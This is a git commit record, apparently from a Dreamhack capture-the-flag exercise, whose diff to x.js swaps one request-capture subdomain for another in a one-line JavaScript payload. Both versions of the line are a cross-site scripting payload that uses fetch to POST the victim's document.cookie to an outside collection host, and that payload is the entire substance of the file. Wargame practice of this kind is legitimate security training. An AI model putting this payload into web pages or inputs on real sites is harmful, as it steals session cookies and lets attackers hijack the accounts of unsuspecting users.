d1e71951e1e5e04f179708f7d29cd4105d74239c
Wonjune <103029974+one3147@users.noreply.github.com>
2024-02-06 17:55:17 +0900

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch("https://otgfhee.request.dreamhack.games", {method: "post", body: document.cookie})//
+fetch("https://brrybxd.request.dreamhack.games", {method: "post", body: document.cookie})//
